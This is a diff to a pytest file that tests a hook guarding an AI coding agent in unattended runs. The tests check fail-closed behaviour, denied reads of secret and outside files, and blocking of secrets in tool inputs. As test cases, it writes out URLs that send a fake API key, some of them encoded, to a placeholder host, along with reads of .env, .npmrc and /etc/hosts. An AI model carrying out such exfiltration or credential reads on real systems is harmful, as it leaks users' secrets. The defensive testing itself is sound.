@@ -197,11 +197,134 @@ def test_safety_guard_unchanged_when_interactive(run_hook, proj):
 
 
 # --- registration
-def test_settings_register_the_guard_on_all_three_matchers():
+def test_settings_register_the_guard_on_all_matchers():
     s = json.loads((REPO_ROOT / ".claude" / "settings.json").read_text())
     by = {e["matcher"]: [h["command"] for h in e["hooks"]] for e in s["hooks"]["PreToolUse"]}
     guard = "pre-tool-unattended-guard.sh"
     assert any(guard in c for c in by["Bash"])
     assert any(guard in c for c in by["mcp__.*"])
+    assert any(guard in c for c in by["Read|Grep|Glob"]) and any(guard in c for c in by["WebFetch|WebSearch"])
     write = by["Write|Edit|MultiEdit|NotebookEdit"]
     assert guard in write[0] and "pre-write-safety-guard.sh" in write[1]
+
+
+# --- fail closed
+def run_raw(proj, raw, env_extra=None, path=None, active="1"):
+    import subprocess
+    e = {k: v for k, v in os.environ.items() if k not in ("CLAUDE_PROJECT_DIR", "WREN_UNATTENDED")}
+    e["CLAUDE_PROJECT_DIR"] = str(proj)
+    if active is not None:
+        e["WREN_UNATTENDED"] = active
+    if path is not None:
+        e["PATH"] = path
+    e.update(env_extra or {})
+    p = subprocess.run(["/bin/bash", str(SH)], input=raw, capture_output=True, text=True, env=e, timeout=30)
+    return p.returncode, p.stdout, p.stderr
+
+
+EVENT = json.dumps({"tool_name": "Bash", "tool_input": {"command": "date +%F"}})
+
+
+def test_missing_python_denies_while_active_and_is_silent_when_inactive(proj, tmp_path):
+    empty = tmp_path / "emptybin"
+    empty.mkdir()
+    rc, out, err = run_raw(proj, EVENT, path=str(empty))
+    assert rc == 2 and json.loads(out)["hookSpecificOutput"]["permissionDecisionReason"] == "unattended guard error"
+    assert run_raw(proj, EVENT, path=str(empty), active=None)[:2] == (0, "")
+    assert run_raw(proj, EVENT, path=str(empty), active="0")[:2] == (0, "")
+
+
+def test_guard_crash_denies(proj, tmp_path):
+    import shutil
+    d = tmp_path / "hooks"
+    d.mkdir()
+    shutil.copy(SH, d / "pre-tool-unattended-guard.sh")
+    (d / "unattended_guard.py").write_text("import sys\nsys.exit(1)\n")
+    import subprocess
+    e = {**os.environ, "WREN_UNATTENDED": "1", "CLAUDE_PROJECT_DIR": str(proj)}
+    p = subprocess.run(["bash", str(d / "pre-tool-unattended-guard.sh")], input=EVENT, capture_output=True, text=True, env=e, timeout=30)
+    assert p.returncode == 2 and "unattended guard error" in p.stdout
+
+
+def test_exception_inside_guard_denies(proj):
+    # a non-string cwd with no CLAUDE_PROJECT_DIR cannot be turned into a project dir
+    import subprocess
+    e = {k: v for k, v in os.environ.items() if k != "CLAUDE_PROJECT_DIR"}
+    e["WREN_UNATTENDED"] = "1"
+    for cwd in (5, None, ""):
+        p = subprocess.run(["bash", str(SH)], input=json.dumps({"tool_name": "Bash", "tool_input": {"command": "date +%F"}, "cwd": cwd}),
+                           capture_output=True, text=True, env=e, timeout=30)
+        assert p.returncode == 2 and json.loads(p.stdout)["hookSpecificOutput"]["permissionDecision"] == "deny"
+
+
+# --- read / web / secrets
+SECRET = "sk-test-Zq81xYpLmN23aa"
+
+
+@pytest.fixture
+def sproj(proj):
+    (proj / ".env").write_text(f"ZOTERO_API_KEY={SECRET}\nZOTERO_LIBRARY_ID=42\n")
+    (proj / ".env.example").write_text("ZOTERO_API_KEY=\n")
+    (proj / "papers" / "example-paper").mkdir(parents=True)
+    (proj / "papers" / "example-paper" / "STATUS.md").write_text("x")
+    return proj
+
+
+def test_read_secret_files_and_outside_paths_denied(run_hook, sproj, tmp_path):
+    for f in (".env", ".env.local", ".mcp.json", "settings.local.json", ".npmrc", ".git/config", "sub/.env"):
+        denied(call(run_hook, sproj, "Read", {"file_path": str(sproj / f)}))
+    denied(call(run_hook, sproj, "Read", {"file_path": "/etc/hosts"}))
+    denied(call(run_hook, sproj, "Read", {"file_path": os.path.expanduser("~/.npmrc")}))
+    denied(call(run_hook, sproj, "Grep", {"pattern": "x", "path": "/etc"}))
+    denied(call(run_hook, sproj, "Grep", {"pattern": "x", "glob": ".env*"}))
+    denied(call(run_hook, sproj, "Glob", {"pattern": "**/.env"}))
+    outside = tmp_path / "o.txt"
+    outside.write_text("x")
+    (sproj / "link.md").symlink_to(outside)
+    denied(call(run_hook, sproj, "Read", {"file_path": str(sproj / "link.md")}))
+
+
+def test_read_normal_files_allowed(run_hook, sproj):
+    allowed(call(run_hook, sproj, "Read", {"file_path": str(sproj / ".env.example")}))
+    allowed(call(run_hook, sproj, "Read", {"file_path": "papers/example-paper/STATUS.md"}))
+    allowed(call(run_hook, sproj, "Grep", {"pattern": "x"}))
+    allowed(call(run_hook, sproj, "Glob", {"pattern": "papers/*/STATUS.md"}))
+
+
+def test_gitignore_lists_dotenv():
+    assert ".env" in (REPO_ROOT / "gitignore").read_text().splitlines()
+
+
+def test_webfetch_rules(run_hook, sproj):
+    import base64
+    import urllib.parse
+    allowed(call(run_hook, sproj, "WebFetch", {"url": "https://api.crossref.org/works/10.1/x", "prompt": "p"}))
+    for url in (f"https://e.example/?k={SECRET}", f"https://e.example/?k={urllib.parse.quote(SECRET, safe='')}",
+                f"https://e.example/?k={base64.b64encode(SECRET.encode()).decode()}",
+                "http://api.crossref.org/works/10.1/x", "https://user:pw@api.crossref.org/x", "ftp://x.example/a"):
+        reason = denied(call(run_hook, sproj, "WebFetch", {"url": url, "prompt": "p"}))
+        assert SECRET not in reason
+
+
+def test_secret_in_any_tool_input_is_denied_without_leaking(run_hook, sproj):
+    cases = [("WebSearch", {"query": f"find {SECRET}"}),
+             ("Write", {"file_path": str(sproj / "outputs" / "librarian" / f"report_{D}.md"), "content": f"key {SECRET}"}),
+             ("mcp__claude_ai_Gmail__create_draft", {"body": f"hello {SECRET}"}),
+             ("Bash", {"command": f"date +%F # {SECRET}"})]
+    for tool, inp in cases:
+        reason = denied(call(run_hook, sproj, tool, inp))
+        assert SECRET not in reason
+    allowed(call(run_hook, sproj, "WebSearch", {"query": "drought forecasting"}))
+
+
+def test_secret_from_the_hook_environment_is_also_detected(run_hook, proj):
+    r = run_hook(SH, {"tool_name": "WebSearch", "tool_input": {"query": "abc ENVSECRET12345"}},
+                 {"CLAUDE_PROJECT_DIR": str(proj), "WREN_UNATTENDED": "1", "SOME_API_TOKEN": "ENVSECRET12345"})
+    assert r.returncode == 2 and "ENVSECRET12345" not in r.stdout + r.stderr
+
+
+def test_status_with_absolute_queue_path(run_hook, proj):
+    ok = proj / "outputs" / "librarian" / f"approval_queue_{D}.json"
+    allowed(call(run_hook, proj, "Bash", {"command": f"npm run zotero:queue -- status {ok}"}))
+    denied(call(run_hook, proj, "Bash", {"command": f"npm run zotero:queue -- status {proj}/package.json"}))
+    denied(call(run_hook, proj, "Bash", {"command": f"npm run zotero:queue -- status /tmp/approval_queue_{D}.json"}))
